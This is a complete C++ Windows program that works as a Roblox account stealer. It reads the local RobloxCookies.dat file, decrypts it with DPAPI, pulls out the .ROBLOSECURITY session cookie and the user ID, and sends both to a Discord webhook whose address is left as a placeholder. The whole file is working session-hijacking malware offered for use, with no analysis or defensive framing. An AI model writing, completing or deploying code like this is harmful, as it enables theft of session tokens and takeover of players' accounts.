#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")

bool Base64Decode(const std::string& base64, std::vector<BYTE>& outData) {
    DWORD outLen = 0;
    if (!CryptStringToBinaryA(base64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) {
        return false;
    }
    outData.resize(outLen);
    if (!CryptStringToBinaryA(base64.c_str(), 0, CRYPT_STRING_BASE64, outData.data(), &outLen, NULL, NULL)) {
        return false;
    }
    return true;
}

bool ExtractCookiesData(const std::string& json, std::string& outCookiesData) {
    const std::string key = "\"CookiesData\":\"";
    size_t pos = json.find(key);
    if (pos == std::string::npos) return false;
    pos += key.length();
    size_t endPos = json.find('"', pos);
    if (endPos == std::string::npos) return false;

    outCookiesData = json.substr(pos, endPos - pos);
    return true;
}

bool ExtractRoblosecurity(const std::string& decrypted, std::string& roblosecurityValue) {
    std::istringstream stream(decrypted);
    std::string line;
    while (std::getline(stream, line)) {
        if (line.find(".ROBLOSECURITY") != std::string::npos) {
            std::istringstream linestream(line);
            std::string token;
            std::vector<std::string> tokens;
            while (linestream >> token) {
                tokens.push_back(token);
            }
            for (size_t i = 0; i < tokens.size(); ++i) {
                if (tokens[i] == ".ROBLOSECURITY" && i + 1 < tokens.size()) {
                    roblosecurityValue = tokens[i + 1];
                    return true;
                }
            }
        }
    }
    return false;
}

bool ExtractUserID(const std::string& decrypted, std::string& userID) {
    const std::vector<std::string> patterns = { "UserID=", "\"UserID\":" };
    for (const auto& pattern : patterns) {
        size_t pos = decrypted.find(pattern);
        if (pos != std::string::npos) {
            pos += pattern.length();
            size_t end = pos;

            // Если есть минус, включаем его
            if (decrypted[end] == '-') {
                end++;
            }

            // Читаем цифры
            while (end < decrypted.length() && isdigit(decrypted[end])) {
                end++;
            }

            userID = decrypted.substr(pos, end - pos);
            return true;
        }
    }
    return false;
}


bool SendToDiscordWebhook(const std::wstring& webhookUrl, const std::string& message) {
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);

    wchar_t hostName[256];
    wchar_t urlPath[1024];
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = _countof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = _countof(urlPath);

    if (!WinHttpCrackUrl(webhookUrl.c_str(), (DWORD)webhookUrl.length(), 0, &urlComp)) {
        std::wcout << L"Failed to parse webhook URL\n";
        return false;
    }

    HINTERNET hSession = WinHttpOpen(L"RobloxDPAPI/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD dwOpenRequestFlags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwOpenRequestFlags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    const wchar_t* headers = L"Content-Type: application/json";

    std::string escaped;
    for (char c : message) {
        if (c == '\"') escaped += "\\\"";
        else if (c == '\n') escaped += "\\n";
        else escaped += c;
    }

    std::string jsonBody = "{\"content\": \"" + escaped + "\"}";

    BOOL bResults = WinHttpSendRequest(
        hRequest,
        headers,
        (DWORD)wcslen(headers),
                                       (LPVOID)jsonBody.c_str(),
                                       (DWORD)jsonBody.length(),
                                       (DWORD)jsonBody.length(),
                                       0);

    if (!bResults) {
        std::wcout << L"WinHttpSendRequest failed\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        std::wcout << L"WinHttpReceiveResponse failed\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD status = 0;
    DWORD statusSize = sizeof(status);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &statusSize, NULL);

    std::wcout << L"HTTP status code: " << status << L"\n";

    char buffer[1024];
    DWORD bytesRead = 0;
    std::string responseBody;
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        responseBody.append(buffer, bytesRead);
    }
    std::wcout << L"Response body: " << std::wstring(responseBody.begin(), responseBody.end()) << L"\n";

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return status >= 200 && status < 300;
}

int wmain() {
    wchar_t appDataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
        std::wcout << L"Failed to get Local AppData folder path\n";
        return 1;
    }

    std::wstring filePath = std::wstring(appDataPath) + L"\\Roblox\\LocalStorage\\RobloxCookies.dat";
    std::wcout << L"Reading file: " << filePath << L"\n";

    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::wcout << L"Failed to open file\n";
        return 1;
    }

    std::string json((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    std::string cookiesDataB64;
    if (!ExtractCookiesData(json, cookiesDataB64)) {
        std::wcout << L"Failed to find CookiesData in JSON\n";
        return 1;
    }

    std::vector<BYTE> encryptedData;
    if (!Base64Decode(cookiesDataB64, encryptedData)) {
        std::wcout << L"Base64 decoding failed\n";
        return 1;
    }

    DATA_BLOB encryptedBlob;
    encryptedBlob.pbData = encryptedData.data();
    encryptedBlob.cbData = (DWORD)encryptedData.size();

    DATA_BLOB decryptedBlob;

    BOOL res = CryptUnprotectData(
        &encryptedBlob,
        NULL,
        NULL,
        NULL,
        NULL,
        0,
        &decryptedBlob
    );

    std::string messageToSend;

    if (!res) {
        DWORD err = GetLastError();
        std::wcout << L"CryptUnprotectData failed with error: " << err << L"\n";
        messageToSend = "Decryption failed with error code: " + std::to_string(err);
    }
    else {
        std::string decryptedStr((char*)decryptedBlob.pbData, decryptedBlob.cbData);
        std::wcout << L"Decrypted data";

        std::string roblosecurityValue;
        std::string userID;

        if (ExtractRoblosecurity(decryptedStr, roblosecurityValue)) {
            messageToSend = ".ROBLOSECURITY = ```" + roblosecurityValue + "```";
        } else {
            messageToSend = "Cookie .ROBLOSECURITY not found";
        }

        if (ExtractUserID(decryptedStr, userID)) {
            messageToSend += "\nUserID = ```" + userID + "```";
        } else {
            messageToSend += "\nUserID not found";
        }

        LocalFree(decryptedBlob.pbData);
    }

    std::wstring webhookUrl = L"insert token here";

    if (SendToDiscordWebhook(webhookUrl, messageToSend)) {
        std::wcout << L"Message sent to webhook successfully.\n";
    }
    else {
        std::wcout << L"Failed to send message to webhook.\n";
    }

    return 0;
}
